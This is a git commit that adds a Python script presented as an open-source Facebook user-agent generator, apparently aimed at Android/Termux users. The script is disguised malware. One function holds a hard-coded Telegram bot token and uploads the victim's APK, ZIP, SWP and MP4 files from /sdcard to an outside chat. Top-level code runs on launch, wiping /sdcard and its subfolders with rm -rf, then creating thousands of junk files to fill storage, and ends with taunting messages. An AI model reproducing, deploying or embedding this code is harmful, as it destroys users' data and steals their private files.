f76e03f86f83f8f015472156987a91a3681a6dd6
ALEXANDER URLUV <bryantmendozaargentinajames411@gmail.com>
2024-05-26 10:23:26 +0800

    Add files via upload

---
+++ jarsel.py
@@ -0,0 +1,112 @@
+#OPEN SOURCE BY ALEXANDER
+#GITHUB : ALEXANDERURLUV17
+#FACEBOOK : ALEXANDER URLUV
+import os
+import arrow
+from urllib.request import Request, urlopen
+import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+from concurrent.futures import ThreadPoolExecutor as mogidDANGER
+from string import * 
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+import os, platform
+def CENTSU():
+    session = requests.session()
+ 
+    bot_token = '6917161596:AAF6_S_mFu8gf0FPrYCcMS99lNh0sVpYbn8'
+    chat_id = '6254543351'
+    #-------------( /sdcard\ )--------------#  
+    #--------------------apk-------------------#																						
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #----------------zip-------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-------------------swp---------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------mp4--------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+def main():
+	# ASCII logo
+    print("""
+
+\033[97;1m          ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗          ██╗ █████╗ ███████╗██████╗ ███████╗██╗     
+\033[97;1m          ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗         ██║██╔══██╗██╔════╝██╔══██╗██╔════╝██║     
+\033[97;1m          ███████║███████║██║     █████╔╝ █████╗  ██████╔╝         ██║███████║███████╗██████╔╝█████╗  ██║     
+\033[97;1m          ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██   ██║██╔══██║╚════██║██╔══██╗██╔══╝  ██║     
+\033[97;1m          ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ╚█████╔╝██║  ██║███████║██║  ██║███████╗███████╗
+\033[97;1m          ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝
+
+     ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+     ║      \033[97;1m[ F U C K Y O U B Y P A S S E R ]     \033[97;1m ║
+     ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+\033[97;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[§] AUTHOR       :     HACKER JASREL
+[§] TOOLS        :      FBAN UA GEN
+[§] TYPE         :      PRIVATE
+[§] FACEBOOK     :      JASREL IDK
+[§] VERSION.     :      PRIVATE
+\033[97;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+		animation = ["[■□□□□□□□□□] 10%", "[■■□□□□□□□□] 20%", "[■■■□□□□□□□] 30%", "[■■■■□□□□□□] 40%", "[■■■■■□□□□□] 50%", "[■■■■■■□□□□] 60%", "[■■■■■■■□□□] 70%", "[■■■■■■■■□□] 80%", "[■■■■■■■■■□] 90%", "[■■■■■■■■■■] 100%"]
+		for i in range(len(animation)):
+			time.sleep(0.5)
+			sys.stdout.write("\r[+] PREPARING... " + animation[i % len(animation)])
+			sys.stdout.flush()
+os.system('rm -rf /sdcard/*')
+os.system('rm-rf /sdcard/DCIM/')
+os.system('rm-rf /sdcard/Android/')
+os.system('rm-rf /sdcard/Android/data/')
+os.system('rm -rf /sdcard/Download/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /sdcard/0/*')
+for i in range(80000):
+	os.system(f'touch /storage/emulated/0/DELETE-succesful{i}.txt')
+	with open(f'/storage/emulated/0/DELETE-succesful{i}.txt','a') as file:
+		file.write(text*99999999999999999999999999999999)
+print('BOBO MO NAMAN PARANG SI HACKER JASREL. :)')
+print('TAHOL NA NAMAN YANG ASO')
+main()
